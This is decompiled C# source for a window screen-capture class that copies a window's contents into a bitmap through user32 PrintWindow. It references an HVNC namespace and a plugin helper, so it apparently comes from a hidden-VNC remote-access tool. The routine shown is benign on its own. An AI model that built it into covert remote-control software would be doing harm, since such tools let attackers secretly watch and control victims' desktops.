using System;
using System.Drawing;
using System.Runtime.InteropServices;
using HVNC;

namespace S
{
	// Token: 0x02000008 RID: 8
	internal class ScreenCapture
	{
		// Token: 0x06000048 RID: 72 RVA: 0x00003424 File Offset: 0x00001624
		public Bitmap CaptureWindow(IntPtr handle)
		{
			ScreenCapture.User32.Rect rect = default(ScreenCapture.User32.Rect);
			ScreenCapture.User32.GetWindowRect(handle, ref rect);
			int num = rect.right - rect.left;
			int num2 = rect.bottom - rect.top;
			Bitmap bitmap = new Bitmap(num + 1, num2 + 1);
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				IntPtr hdc = graphics.GetHdc();
				bool higherThan = Plugin.Helper.HigherThan81;
				if (higherThan)
				{
					ScreenCapture.User32.PrintWindow(handle, hdc, 2U);
				}
				else
				{
					ScreenCapture.User32.PrintWindow(handle, hdc, 0U);
				}
			}
			return bitmap;
		}

		// Token: 0x02000016 RID: 22
		private class User32
		{
			// Token: 0x06000088 RID: 136
			[DllImport("user32.dll")]
			public static extern IntPtr GetWindowRect(IntPtr hWnd, ref ScreenCapture.User32.Rect rect);

			// Token: 0x06000089 RID: 137
			[DllImport("user32.dll")]
			public static extern bool PrintWindow(IntPtr hwnd, IntPtr hdcBlt, uint nFlags);

			// Token: 0x02000026 RID: 38
			public struct Rect
			{
				// Token: 0x040000A7 RID: 167
				public int left;

				// Token: 0x040000A8 RID: 168
				public int top;

				// Token: 0x040000A9 RID: 169
				public int right;

				// Token: 0x040000AA RID: 170
				public int bottom;
			}
		}
	}
}
